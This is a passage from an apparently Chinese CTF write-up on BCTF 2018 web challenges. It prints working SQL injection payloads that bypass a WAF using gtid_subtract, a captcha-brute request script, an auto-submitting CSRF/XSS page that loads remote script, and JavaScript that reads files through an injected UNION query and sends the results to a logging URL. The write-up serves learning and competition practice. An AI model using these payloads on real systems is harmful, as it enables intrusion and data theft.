title="https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI">https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI</a> 存个poc.jpg,上传改session,登录到admin <a href="/images/2018/11/2018-11-29-19-42-20屏幕截图.png"><img src="/images/2018/11/2018-11-29-19-42-20屏幕截图.png" /></a> 然后adminpanel拿到flag <a href="/images/2018/11/2018-11-29-19-42-38-创建的截图.png"><img src="/images/2018/11/2018-11-29-19-42-38-创建的截图.png" /></a></p><h2 id="babysqlispa">babySQLiSPA</h2><p>/api/hints可以注入 难点是绕过 mysql版本5.7.24,大多数几何函数无法使用.polygon可以爆库名和表名,但是没用,得去找flag表 这里mysql5.7之后新增的报错函数有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ST_LatFromGeoHash()</span><br><span class="line">    select ST_LatFromGeoHash(version());</span><br><span class="line">ST_LongFromGeoHash()</span><br><span class="line">    select ST_LongFromGeoHash(version());</span><br><span class="line">GTID_SUBSET()</span><br><span class="line">    select GTID_SUBSET(version(),1);</span><br><span class="line">GTID_SUBTRACT()</span><br><span class="line">    select GTID_SUBTRACT(version(),1);</span><br><span class="line">ST_PointFromGeoHash()</span><br><span class="line">    select ST_PointFromGeoHash(version(),1);</span><br></pre></td></tr></table></figure><p>需要过的waf</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">checkHint</span> (hint) &#123;</span><br><span class="line"> <span class="keyword">return</span> ! <span class="regexp">/ ;\+-\*\/</span></span><br><span class="line"><span class="regexp">&lt;&gt;~!\d%\x09\x0a\x0b\x0c\x0d`gtid_subsethashjsonst\_updatexm</span></span><br><span class="line"><span class="regexp">lextractvaluefloorrandexpjson_keysuuid_to_binbin_to_uuidunionlike</span></span><br><span class="line"><span class="regexp">sleepbenchmark/ig</span>.<span class="title function_">test</span>(hint)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">data= &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;blacsheep11&#x27;</span>&#125;</span><br><span class="line">r=u.post(<span class="string">&#x27;http://47.93.100.42:9999/api/login&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(src).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">src</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[:<span class="number">6</span>]==<span class="built_in">str</span>(src):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r=u.get(<span class="string">&#x27;http://47.93.100.42:9999/api/captcha&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    prefix= re.findall(<span class="string">r&#x27;&quot;captcha&quot;:&quot;(.&#123;6&#125;)&quot;&#125;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    captcha = calc(prefix)</span><br><span class="line">    hint=<span class="built_in">input</span>(<span class="string">&#x27;hints:&#x27;</span>)</span><br><span class="line">    data=&#123;<span class="string">&#x27;captcha&#x27;</span>:captcha,<span class="string">&#x27;hint&#x27;</span>:hint&#125;</span><br><span class="line">    r=u.post(<span class="string">&#x27;http://47.93.100.42:9999/api/hints&#x27;</span>,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>使用gtid_subtract绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;FdkuBNGoarFgVBwDjHcZBwwBFKNnkGDrIRubYZZtAGOifUogHPjXLyFhGxPfNWyE,Hints,MztsezsxCgHmgbYoeQGqKteosCHjfpXoGCFVjNPEpIKzFjCPYRmOMQAKgVCuoOZX,TLcLvkgTjVjFvBrUfhsqkZFMcRCVlqzEfTPxujYcwzQDtJRGzFRKqmxxapLckUBI&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><p>发现表名一片混乱,和pgg聊天的时候他说nu1l那边一直卡在表名这个地方2333 后来他们限定表名长度来提取的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#x27;j&#x27;)^ord(&#x27;t&#x27;)))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><p>表名长度30的时候找到flag表,payload有长度限制,所以爆列名的时候稍微改一下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;gtid_subtract((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#x27;.&quot;&#125;</span><br><span class="line">hints:&#x27;gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;BCTF&#123;060950FB-839E-4B57-B91D-51E78F56856F&#125;&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="seafaring1">SeaFaring1</h2><p>这题评论的链接会被机器人访问 注意到robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/handle_message.php</span><br></pre></td></tr></table></figure><p>curl一下/admin 发现部分源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">view_uid</span>(<span class="params">uid</span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_uid&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    $(<span class="string">&#x27;#timestamp&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;timestamp&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;user_name&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#message&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>=data[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[<span class="string">&#x27;is_checked&#x27;</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;status&quot;</span>).<span class="property">innerHTML</span> = <span class="title class_">Status</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">view_unreads</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_unreads&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set_reply</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> uid = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">var</span>  reply =  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replymessage&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;set_reply&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid, <span class="string">&quot;reply&quot;</span>: reply&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Succ: &#x27;</span> + data);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">load_all</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;load_all&quot;</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(load_all, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>发现<code>/admin/handle_message.php</code>存在xss</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST -d <span class="string">&quot;token=&lt;img src=1 onerror=alert(/xss/)&gt;&amp;action=view_id&amp;uid=1&quot;</span> <span class="string">&#x27;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;CSRFToken  &#x27;&lt;img src=1 onerror=alert(\/xss\/)&gt;&#x27;is not correct&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>构造一个html页面让bot去访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    window.onload =function()&#123;</span><br><span class="line">    document.getElementById(&quot;f&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot;    id=&quot;f&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;script src=http://t.cn/ELTmXGg&gt;&lt;/script&gt;&lt;script src=http://localhost/bctf_evil_oqwej98czc.js&gt;&lt;/script&gt;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;view_id&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>外部引入的js文件(改自Nu1l的师傅)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">req</span>(<span class="params">url,data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-formurlencoded&quot;</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    <span class="keyword">var</span> resp = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_csrf_token</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">    <span class="keyword">var</span> res = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">var</span> csrftoken = res.<span class="title function_">match</span>(<span class="regexp">/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig</span>)[<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;=&quot;&#x27;</span>)[<span class="number">1</span>].<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> csrftoken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;http://localhost/log.php?data=&quot;</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ress=<span class="title function_">req</span>(<span class="string">&quot;http://172.20.0.2:6379/&quot;</span>,<span class="string">&quot;token=&quot;</span>+<span class="title function_">get_csrf_token</span>()+<span class="string">&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;</span>);</span><br><span class="line"><span class="title function_">send</span>(ress);</span><br></pre></td></tr></table></figure><p>然后就可以在vps上面收结果了 不过复现的时候发现并没有收到结果 看了下日志发现bot只是访问了csrf页面而并没有载入js文件...不太清楚原因 访问成功之后就发现是个后台的sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug 